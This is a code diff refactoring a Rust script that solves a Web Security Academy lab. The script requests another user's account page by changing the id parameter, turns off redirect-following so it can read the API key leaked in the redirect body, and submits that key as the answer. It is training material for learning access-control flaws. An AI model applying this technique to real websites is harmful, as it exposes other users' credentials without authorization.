@@ -1,25 +1,17 @@
-/******************************************************************************
-*
-* Author: Ahmed Elqalaawy (@elqal3awii)
-*
-* Date: 5/9/2023
+/***********************************************************************************
 *
 * Lab: User ID controlled by request parameter with data leakage in redirect
 *
-* Steps: 1. Fetch carlos profile
-*        2. Extract the API key from response body before
-*           redirecting to login page
-*        3. Submit the solution
+* Hack Steps: 
+*      1. Fetch carlos profile
+*      2. Extract the API key from response body before redirecting to login page
+*      3. Submit the solution
 *
-*******************************************************************************/
-#![allow(unused)]
-/***********
-* Imports
-***********/
+************************************************************************************/
+use lazy_static::lazy_static;
 use regex::Regex;
 use reqwest::{
     blocking::{Client, ClientBuilder, Response},
-    header::HeaderMap,
     redirect::Policy,
 };
 use std::{
@@ -29,63 +21,37 @@ use std::{
 };
 use text_colorizer::Colorize;
 
-/******************
-* Main Function
-*******************/
-fn main() {
-    // change this to your lab URL
-    let url = "https://0a0f002604f28172877671b8005f0093.web-security-academy.net";
+// Change this to your lab URL
+const LAB_URL: &str = "https://0a3e002703bf1cf4831428cc00480092.web-security-academy.net";
 
-    // build the client that will be used for all subsequent requests
-    let client = build_client();
-
-    print!("{} ", "1. Fetching carlos profile page..".white());
-    io::stdout().flush();
-
-    // fetch carlos profile
-    let carlos_profile = client
-        .get(format!("{url}/my-account?id=carlos"))
-        .send()
-        .expect(&format!("{}", "[!] Failed to fetch carlos profile".red()));
-
-    println!("{}", "OK".green());
-    print!(
-        "{} ",
-        "2. Extracting the API key from response body before redirecting..".white()
-    );
-    io::stdout().flush();
-
-    // extract the API key of carlos from response body before redircting
-    let body = carlos_profile.text().unwrap();
-    let api_key = capture_pattern("Your API Key is: (.*)</div>", &body)
-        .expect(&format!("{}", "[!] Failed to extract the API key".red()));
-
-    println!("{}", "OK".green());
-    print!("{} ", "3. Submitting the solution..".white());
-    io::stdout().flush();
-
-    // submit the solution
-    client
-        .post(format!("{url}/submitSolution"))
-        .form(&HashMap::from([("answer", api_key)]))
-        .send()
-        .expect(&format!("{}", "[!] Failed to submit the solution".red()));
-
-    println!("{}", "OK".green());
-    println!(
-        "{} {}",
-        "🗹 The lab should be marked now as"
-            .white()
-            .bold(),
-        "solved".green().bold()
-    )
+lazy_static! {
+    static ref WEB_CLIENT: Client = build_web_client();
 }
 
-/*******************************************************************
-* Function used to build the client
-* Return a client that will be used in all subsequent requests
-********************************************************************/
-fn build_client() -> Client {
+fn main() {
+    print!("⦗1⦘ Fetching carlos profile page.. ");
+    flush_terminal();
+
+    let carlos_profile = fetch("/my-account?id=carlos");
+
+    println!("{}", "OK".green());
+    print!("⦗2⦘ Extracting the API key from response body before redirecting.. ");
+    flush_terminal();
+
+    let body = carlos_profile.text().unwrap();
+    let api_key = capture_pattern_from_text("Your API Key is: (.*)</div>", &body);
+
+    println!("{}", "OK".green());
+    print!("⦗3⦘ Submitting the solution.. ");
+    flush_terminal();
+
+    submit_solution(&api_key);
+
+    println!("{}", "OK".green());
+    println!("🗹 The lab should be marked now as {}", "solved".green())
+}
+
+fn build_web_client() -> Client {
     ClientBuilder::new()
         .redirect(Policy::none())
         .connect_timeout(Duration::from_secs(5))
@@ -93,26 +59,31 @@ fn build_client() -> Client {
         .unwrap()
 }
 
-/********************************************
-* Function to capture a pattern form a text
-*********************************************/
-fn capture_pattern(pattern: &str, text: &str) -> Option<String> {
-    let pattern = Regex::new(pattern).unwrap();
-    if let Some(text) = pattern.captures(text) {
-        Some(text.get(1).unwrap().as_str().to_string())
-    } else {
-        None
-    }
+fn fetch(path: &str) -> Response {
+    WEB_CLIENT
+        .get(format!("{LAB_URL}{path}"))
+        .send()
+        .expect(&format!("⦗!⦘ Failed to fetch: {}", path.red()))
 }
 
-/**********************************************************
-* Function to extract session field from the cookie header
-***********************************************************/
-fn extract_session_cookie(headers: &HeaderMap) -> Option<String> {
-    let cookie = headers.get("set-cookie").unwrap().to_str().unwrap();
-    if let Some(session) = capture_pattern("session=(.*); Secure", cookie) {
-        Some(session.as_str().to_string())
-    } else {
-        None
-    }
+fn submit_solution(answer: &str) {
+    WEB_CLIENT
+        .post(format!("{LAB_URL}/submitSolution"))
+        .form(&HashMap::from([("answer", answer)]))
+        .send()
+        .expect(&format!("{}", "⦗!⦘ Failed to submit the solution".red()));
+}
+
+fn capture_pattern_from_text(pattern: &str, text: &str) -> String {
+    let regex = Regex::new(pattern).unwrap();
+    let captures = regex.captures(text).expect(&format!(
+        "⦗!⦘ Failed to capture the pattern: {}",
+        pattern.red()
+    ));
+    captures.get(1).unwrap().as_str().to_string()
+}
+
+#[inline(always)]
+fn flush_terminal() {
+    io::stdout().flush().unwrap();
 }
